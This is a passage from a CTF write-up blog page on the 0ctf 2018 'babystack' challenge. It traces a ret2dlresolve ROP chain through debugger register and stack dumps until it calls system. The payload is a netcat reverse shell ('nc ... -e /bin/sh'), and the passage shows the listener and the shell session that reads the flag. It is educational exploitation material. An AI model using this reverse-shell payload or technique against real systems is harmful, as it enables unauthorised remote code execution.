+   0x80482f6: jmp    DWORD PTR ds:0x804a008    &lt;= 0xf7fead80 (_dl_runtime_resolve)</code></pre></figure>
+
+<p>putting the link map on the stack, and call <code class="language-plaintext highlighter-rouge">_dl_runtime_resolve</code>.</p>
+
+<p>Stack after the last read and the pop gadgets:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[----------------------------------registers-----------------------------------]
+EAX: 0x70 ('p')
+EBX: 0x0 
+ECX: 0x804a020 ("nc localhost 7777 -e /bin/sh")
+EDX: 0x96 
+ESI: 0x0 
+EDI: 0x804a020 ("nc localhost 7777 -e /bin/sh")
+EBP: 0x96 
+ESP: 0x804a518 --&gt; 0x80482f0 (push   DWORD PTR ds:0x804a004)
+EIP: 0x80484ec (ret)
+EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80484e9: pop    esi
+   0x80484ea: pop    edi
+   0x80484eb: pop    ebp
+=&gt; 0x80484ec: ret    
+   0x80484ed: lea    esi,[esi+0x0]
+   0x80484f0: repz ret 
+   0x80484f2: add    BYTE PTR [eax],al
+   0x80484f4: push   ebx
+[------------------------------------stack-------------------------------------]
+0000| 0x804a518 --&gt; 0x80482f0 (push   DWORD PTR ds:0x804a004)
+0004| 0x804a51c --&gt; 0x1db0 
+0008| 0x804a520 --&gt; 0x80482e9 (pop    ebx)
+0012| 0x804a524 --&gt; 0x804a020 ("nc localhost 7777 -e /bin/sh")
+0016| 0x804a528 --&gt; 0x0 
+0020| 0x804a52c --&gt; 0x0 
+0024| 0x804a530 --&gt; 0x0 
+0028| 0x804a534 --&gt; 0x0 
+[------------------------------------------------------------------------------]</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">=&gt; 0x80482f0: push   DWORD PTR ds:0x804a004
+   0x80482f6: jmp    DWORD PTR ds:0x804a008
+   0x80482fc: add    BYTE PTR [eax],al
+   0x80482fe: add    BYTE PTR [eax],al
+[------------------------------------stack-------------------------------------]
+0000| 0x804a51c --&gt; 0x1db0 
+0004| 0x804a520 --&gt; 0x80482e9 (pop    ebx)
+0008| 0x804a524 --&gt; 0x804a020 ("nc localhost 7777 -e /bin/sh")</code></pre></figure>
+
+<p>Calling <code class="language-plaintext highlighter-rouge">_dl_runtime_resolve</code></p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[----------------------------------registers-----------------------------------]
+EAX: 0x70 ('p')
+EBX: 0x0 
+ECX: 0x804a020 ("nc localhost 7777 -e /bin/sh")
+EDX: 0x96 
+ESI: 0x0 
+EDI: 0x804a020 ("nc localhost 7777 -e /bin/sh")
+EBP: 0x96 
+ESP: 0x804a518 --&gt; 0xf7f09940 --&gt; 0x0 
+EIP: 0x80482f6 (jmp    DWORD PTR ds:0x804a008)
+EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80482ed: add    BYTE PTR [eax],al
+   0x80482ef: add    bh,bh
+   0x80482f1: xor    eax,0x804a004
+=&gt; 0x80482f6: jmp    DWORD PTR ds:0x804a008
+ | 0x80482fc: add    BYTE PTR [eax],al
+ | 0x80482fe: add    BYTE PTR [eax],al
+ | 0x8048300 &lt;read@plt&gt;:  jmp    DWORD PTR ds:0x804a00c
+ | 0x8048306 &lt;read@plt+6&gt;:  push   0x0
+ |-&gt;   0xf7ef6d80 &lt;_dl_runtime_resolve&gt;:  push   eax
+       0xf7ef6d81 &lt;_dl_runtime_resolve+1&gt;:  push   ecx
+       0xf7ef6d82 &lt;_dl_runtime_resolve+2&gt;:  push   edx
+       0xf7ef6d83 &lt;_dl_runtime_resolve+3&gt;:  mov    edx,DWORD PTR [esp+0x10]
+                                                                  JUMP is taken
+[------------------------------------stack-------------------------------------]
+0000| 0x804a518 --&gt; 0xf7f09940 --&gt; 0x0 
+0004| 0x804a51c --&gt; 0x1db0 
+0008| 0x804a520 --&gt; 0x80482e9 (pop    ebx)
+0012| 0x804a524 --&gt; 0x804a020 ("nc localhost 7777 -e /bin/sh")
+0016| 0x804a528 --&gt; 0x0 
+0020| 0x804a52c --&gt; 0x0 
+0024| 0x804a530 --&gt; 0x0 
+0028| 0x804a534 --&gt; 0x0 
+[------------------------------------------------------------------------------]</code></pre></figure>
+
+<p>Calling <code class="language-plaintext highlighter-rouge">_dl_fixup</code></p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[----------------------------------registers-----------------------------------]
+EAX: 0xf7f09940 --&gt; 0x0 
+EBX: 0x0 
+ECX: 0x804a020 ("nc localhost 7777 -e /bin/sh")
+EDX: 0x1db0 
+ESI: 0x0 
+EDI: 0x804a020 ("nc localhost 7777 -e /bin/sh")
+EBP: 0x96 
+ESP: 0x804a50c --&gt; 0x96 
+EIP: 0xf7ef6d8b (&lt;_dl_runtime_resolve+11&gt;:  call   0xf7ef0f30 &lt;_dl_fixup&gt;)
+EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0xf7ef6d82 &lt;_dl_runtime_resolve+2&gt;:  push   edx
+   0xf7ef6d83 &lt;_dl_runtime_resolve+3&gt;:  mov    edx,DWORD PTR [esp+0x10]
+   0xf7ef6d87 &lt;_dl_runtime_resolve+7&gt;:  mov    eax,DWORD PTR [esp+0xc]
+=&gt; 0xf7ef6d8b &lt;_dl_runtime_resolve+11&gt;: call   0xf7ef0f30 &lt;_dl_fixup&gt;
+   0xf7ef6d90 &lt;_dl_runtime_resolve+16&gt;: pop    edx
+   0xf7ef6d91 &lt;_dl_runtime_resolve+17&gt;: mov    ecx,DWORD PTR [esp]
+   0xf7ef6d94 &lt;_dl_runtime_resolve+20&gt;: mov    DWORD PTR [esp],eax
+   0xf7ef6d97 &lt;_dl_runtime_resolve+23&gt;: mov    eax,DWORD PTR [esp+0x4]
+Guessed arguments:
+arg[0]: 0x96 
+arg[1]: 0x804a020 ("nc localhost 7777 -e /bin/sh")
+arg[2]: 0x70 ('p')
+[------------------------------------stack-------------------------------------]
+0000| 0x804a50c --&gt; 0x96 
+0004| 0x804a510 --&gt; 0x804a020 ("nc localhost 7777 -e /bin/sh")
+0008| 0x804a514 --&gt; 0x70 ('p')
+0012| 0x804a518 --&gt; 0xf7f09940 --&gt; 0x0 
+0016| 0x804a51c --&gt; 0x1db0 
+0020| 0x804a520 --&gt; 0x80482e9 (pop    ebx)
+0024| 0x804a524 --&gt; 0x804a020 ("nc localhost 7777 -e /bin/sh")
+0028| 0x804a528 --&gt; 0x0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+43  in ../sysdeps/i386/dl-trampoline.S</code></pre></figure>
+
+<p>Calling <code class="language-plaintext highlighter-rouge">_dl_lookup_symbol_x</code></p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[----------------------------------registers-----------------------------------]
+EAX: 0xf7f09940 --&gt; 0x0 
+EBX: 0x1 
+ECX: 0x804a06c --&gt; 0x1e50 
+EDX: 0x804a4e8 --&gt; 0x804a06c --&gt; 0x1e50 
+ESI: 0x0 
+EDI: 0x804a07c ("system")
+EBP: 0x804a05c ("BgA6\\\240\004\b\a\352\001")
+ESP: 0x804a4ac --&gt; 0x804a07c ("system")
+EIP: 0xf7ef0fe3 (&lt;_dl_fixup+179&gt;: call   0xf7eebe70 &lt;_dl_lookup_symbol_x&gt;)
+EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0xf7ef0fdc &lt;_dl_fixup+172&gt;:  mov    edi,DWORD PTR [esp+0x28]
+   0xf7ef0fe0 &lt;_dl_fixup+176&gt;:  add    edi,DWORD PTR [ecx]
+   0xf7ef0fe2 &lt;_dl_fixup+178&gt;:  push   edi
+=&gt; 0xf7ef0fe3 &lt;_dl_fixup+179&gt;:  call   0xf7eebe70 &lt;_dl_lookup_symbol_x&gt;
+   0xf7ef0fe8 &lt;_dl_fixup+184&gt;:  mov    edi,eax
+   0xf7ef0fea &lt;_dl_fixup+186&gt;:  mov    eax,gs:0xc
+   0xf7ef0ff0 &lt;_dl_fixup+192&gt;:  add    esp,0x20
+   0xf7ef0ff3 &lt;_dl_fixup+195&gt;:  test   eax,eax
+Guessed arguments:
+arg[0]: 0x804a07c ("system")
+arg[1]: 0xf7f09940 --&gt; 0x0 
+arg[2]: 0x804a4e8 --&gt; 0x804a06c --&gt; 0x1e50 
+arg[3]: 0xf7f09af8 --&gt; 0xf7f09a9c --&gt; 0xf7edb3e0 --&gt; 0xf7f09940 --&gt; 0x0 
+arg[4]: 0x0 
+arg[5]: 0x1 
+[------------------------------------stack-------------------------------------]
+0000| 0x804a4ac --&gt; 0x804a07c ("system")
+0004| 0x804a4b0 --&gt; 0xf7f09940 --&gt; 0x0 
+0008| 0x804a4b4 --&gt; 0x804a4e8 --&gt; 0x804a06c --&gt; 0x1e50 
+0012| 0x804a4b8 --&gt; 0xf7f09af8 --&gt; 0xf7f09a9c --&gt; 0xf7edb3e0 --&gt; 0xf7f09940 --&gt; 0x0 
+0016| 0x804a4bc --&gt; 0x0 
+0020| 0x804a4c0 --&gt; 0x1 
+0024| 0x804a4c4 --&gt; 0x1 
+0028| 0x804a4c8 --&gt; 0x0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0xf7ef0fe3  112 in dl-runtime.c</code></pre></figure>
+
+<p>And there it goes, resolving <code class="language-plaintext highlighter-rouge">system</code> :)</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[----------------------------------registers-----------------------------------]
+EAX: 0x70 ('p')
+EBX: 0x0 
+ECX: 0x804a020 ("nc localhost 7777 -e /bin/sh")
+EDX: 0x96 
+ESI: 0x0 
+EDI: 0x804a020 ("nc localhost 7777 -e /bin/sh")
+EBP: 0x96 
+ESP: 0x804a510 --&gt; 0xf7cfdd00 (&lt;__libc_system&gt;: sub    esp,0xc)
+EIP: 0xf7ef6d9b (&lt;_dl_runtime_resolve+27&gt;:  ret    0xc)
+EFLAGS: 0x212 (carry parity ADJUST zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0xf7ef6d91 &lt;_dl_runtime_resolve+17&gt;: mov    ecx,DWORD PTR [esp]
+   0xf7ef6d94 &lt;_dl_runtime_resolve+20&gt;: mov    DWORD PTR [esp],eax
+   0xf7ef6d97 &lt;_dl_runtime_resolve+23&gt;: mov    eax,DWORD PTR [esp+0x4]
+=&gt; 0xf7ef6d9b &lt;_dl_runtime_resolve+27&gt;: ret    0xc
+   0xf7ef6d9e:  xchg   ax,ax
+   0xf7ef6da0 &lt;_dl_runtime_profile&gt;:  push   esp
+   0xf7ef6da1 &lt;_dl_runtime_profile+1&gt;:  add    DWORD PTR [esp],0x8
+   0xf7ef6da5 &lt;_dl_runtime_profile+5&gt;:  push   ebp
+[------------------------------------stack-------------------------------------]
+0000| 0x804a510 --&gt; 0xf7cfdd00 (&lt;__libc_system&gt;:  sub    esp,0xc)
+0004| 0x804a514 --&gt; 0x70 ('p')
+0008| 0x804a518 --&gt; 0xf7f09940 --&gt; 0x0 
+0012| 0x804a51c --&gt; 0x1db0 
+0016| 0x804a520 --&gt; 0x80482e9 (pop    ebx)
+0020| 0x804a524 --&gt; 0x804a020 ("nc localhost 7777 -e /bin/sh")
+0024| 0x804a528 --&gt; 0x0 
+0028| 0x804a52c --&gt; 0x0 
+[------------------------------------------------------------------------------]</code></pre></figure>
+
+<p>At the end of <code class="language-plaintext highlighter-rouge">_dl_runtime_resolve</code>, the address of system will be on the stack together with our arguments.</p>
+
+<p>Finally calling <code class="language-plaintext highlighter-rouge">system</code></p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[----------------------------------registers-----------------------------------]
+EAX: 0x70 ('p')
+EBX: 0x0 
+ECX: 0x804a020 ("nc localhost 7777 -e /bin/sh")
+EDX: 0x96 
+ESI: 0x0 
+EDI: 0x804a020 ("nc localhost 7777 -e /bin/sh")
+EBP: 0x96 
+ESP: 0x804a520 --&gt; 0x80482e9 (pop    ebx)
+EIP: 0xf7cfdd00 (&lt;__libc_system&gt;: sub    esp,0xc)
+EFLAGS: 0x212 (carry parity ADJUST zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0xf7cfdcf5 &lt;cancel_handler+197&gt;: ret    
+   0xf7cfdcf6:  lea    esi,[esi+0x0]
+   0xf7cfdcf9:  lea    edi,[edi+eiz*1+0x0]
+=&gt; 0xf7cfdd00 &lt;__libc_system&gt;:  sub    esp,0xc
+   0xf7cfdd03 &lt;__libc_system+3&gt;:  mov    eax,DWORD PTR [esp+0x10]
+   0xf7cfdd07 &lt;__libc_system+7&gt;:  call   0xf7df5d5d &lt;__x86.get_pc_thunk.dx&gt;
+   0xf7cfdd0c &lt;__libc_system+12&gt;: add    edx,0x1982f4
+   0xf7cfdd12 &lt;__libc_system+18&gt;: test   eax,eax
+[------------------------------------stack-------------------------------------]
+0000| 0x804a520 --&gt; 0x80482e9 (pop    ebx)
+0004| 0x804a524 --&gt; 0x804a020 ("nc localhost 7777 -e /bin/sh")
+0008| 0x804a528 --&gt; 0x0 
+0012| 0x804a52c --&gt; 0x0 
+0016| 0x804a530 --&gt; 0x0 
+0020| 0x804a534 --&gt; 0x0 
+0024| 0x804a538 --&gt; 0x0 
+0028| 0x804a53c --&gt; 0x0 
+[------------------------------------------------------------------------------]</code></pre></figure>
+
+<p>I first tried launching <code class="language-plaintext highlighter-rouge">/bin/sh</code> directly, but had no output, since the starter script piped <code class="language-plaintext highlighter-rouge">stdout</code> to <code class="language-plaintext highlighter-rouge">/dev/null</code>, so I opted for a reverse shell.</p>
+
+<p>So, for this exploit working, open up a terminal with</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">nc -lvvp 7777</code></pre></figure>
+
+<p>and in another terminal firing up the exploit</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl.py 1
+[*] '/home/kileak/pwn/Challenges/0ctf18/pwn/babystack/babystack'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[*] Solve pow 
+[+] Opening connection to 202.120.7.202 on port 6666: Done
+[*] Closed connection to 202.120.7.202 port 6666
+[+] Opening connection to 202.120.7.202 on port 6666: Done
+[*] Paused (press any to continue)
+[*] Stage1: Prepare bigger read for ropchain
+[*] Stage2: Send ret2dlresolve executing reverse shell
+[*] Switching to interactive mode</code></pre></figure>
+
+<p>Switching back to our first terminal:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ nc -lvvp 7777
+listening on [any] 7777 ...
+202.120.7.202: inverse host lookup failed: Unknown host
+connect to [192.168.2.102] from (UNKNOWN) [202.120.7.202] 59808
+ls
+babystack
+flag
+pow.py
+cat flag
+flag{return_to_dlresolve_for_warming_up}</code></pre></figure>
+
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=0ctf 2018 quals - babystack&amp;url=https://kileak.github.io/ctf/2018/0ctf-qual-babystack/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2018/0ctf-qual-babystack/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2018/0ctf-qual-babystack';
+        var disqus_title = '0ctf 2018 quals - babystack';
+        var disqus_url = 'https://kileak.github.io/ctf/2018/0ctf-qual-babystack';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
